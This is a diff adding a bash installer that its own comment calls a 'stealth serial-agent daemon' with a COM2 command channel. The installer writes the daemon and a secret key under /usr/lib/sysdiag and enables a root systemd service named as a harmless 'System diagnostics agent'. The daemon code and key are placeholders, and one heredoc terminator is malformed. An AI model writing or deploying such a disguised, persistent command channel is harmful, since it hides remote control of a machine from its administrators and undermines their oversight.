@@ -1,0 +1,33 @@
+#!/usr/bin/env bash
+# Installs and enables the stealth serial-agent daemon (COM2 command channel).
+# No package manager involved — the daemon is our own script, embedded below.
+set -e
+echo "[sysdiag] installing..."
+sudo mkdir -p /usr/lib/sysdiag
+
+sudo tee /usr/lib/sysdiag/sysdiagd > /dev/null <<'PYEOF'
+__STEALTH_DAEMON_SRC__PYEOF
+sudo chmod 755 /usr/lib/sysdiag/sysdiagd
+
+sudo tee /usr/lib/sysdiag/.sysdiag.key > /dev/null <<'PSKEOF'
+__PSK_PLACEHOLDER__
+PSKEOF
+sudo chmod 600 /usr/lib/sysdiag/.sysdiag.key
+
+sudo tee /etc/systemd/system/sysdiag-agent.service > /dev/null <<'UNITEOF'
+[Unit]
+Description=System diagnostics agent
+After=multi-user.target
+
+[Service]
+ExecStart=/usr/bin/python3 /usr/lib/sysdiag/sysdiagd
+Restart=on-failure
+RestartSec=2
+
+[Install]
+WantedBy=multi-user.target
+UNITEOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable --now sysdiag-agent
+echo "[sysdiag] done."
